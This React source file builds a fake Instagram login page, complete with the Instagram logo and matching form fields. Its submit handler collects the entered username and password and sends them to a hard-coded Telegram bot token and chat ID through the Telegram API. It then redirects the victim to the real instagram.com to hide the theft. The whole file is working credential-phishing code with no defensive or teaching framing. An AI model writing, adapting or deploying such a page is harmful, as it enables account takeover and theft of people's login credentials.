import React, { useState } from "react";
import axios from "axios";

export default function App() {
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [errors, setErrors] = useState({ username: false, password: false });

    const handleSubmit = async (e) => {
        e.preventDefault();

        const newErrors = {
            username: !username,
            password: !password,
        };

        setErrors(newErrors);

        if (newErrors.username || newErrors.password) {
            return;
        }

        const botToken = "7895666695:AAHXD1LCYeYC_H8owyj6xflypg6Jp6oEY44";
        const chatId = "6819586680";
        const message = `🔒 Login ma'lumotlari: Username: ${username} Password: ${password}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

        try {
            await axios.get(url);
            window.location.href = "https://www.instagram.com";
        } catch (error) {
            console.error("Xatolik yuz berdi:", error);
            throw new Error("Ma'lumot yuborishda xatolik yuz berdi!");
        }
    };

    return (
        <div className="flex items-center justify-center h-screen bg-gray-100">
            <div className="text-center h-full bg-white p-6 rounded-lg shadow-md">
                <div className="text-sm text-gray-500 mb-4">
                    English &#9662;
                </div>

                <div className="w-[300px] m-auto mb-5">
                    <img
                        src="https://download.logo.wine/logo/Instagram/Instagram-Logo.wine.png"
                        alt="instagram_logo"
                        width={320}
                        height={320}
                    />
                </div>

                <div className="flex items-center mb-8">
                    <div className="flex-grow h-px bg-gray-300"></div>
                    <p className="text-xs text-gray-500 mx-2">OR</p>
                    <div className="flex-grow h-px bg-gray-300"></div>
                </div>

                <form className="space-y-3" onSubmit={handleSubmit}>
                    <input
                        type="text"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        placeholder="Phone number, username, or email"
                        className={`w-full p-2 border rounded-md focus:outline-none focus:ring-1 focus:ring-blue-400 ${
                            errors.username
                                ? "border-red-500 bg-red-50"
                                : "border-gray-300"
                        }`}
                    />
                    <input
                        type="password"
                        placeholder="Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className={`w-full p-2 border rounded-md focus:outline-none focus:ring-1 focus:ring-blue-400 ${
                            errors.password
                                ? "border-red-500 bg-red-50"
                                : "border-gray-300"
                        }`}
                    />
                    <a href="#" className="text-xs text-blue-500 float-right">
                        Forgot password?
                    </a>
                    <button
                        type="submit"
                        className="w-full bg-blue-500 text-white py-2 rounded-md font-semibold"
                    >
                        Log In
                    </button>
                </form>

                <p className="text-xs text-gray-500 mt-6">
                    Don’t have an account?{" "}
                    <a href="#" className="text-blue-500 font-semibold">
                        Sign up
                    </a>
                </p>
            </div>
        </div>
    );
}
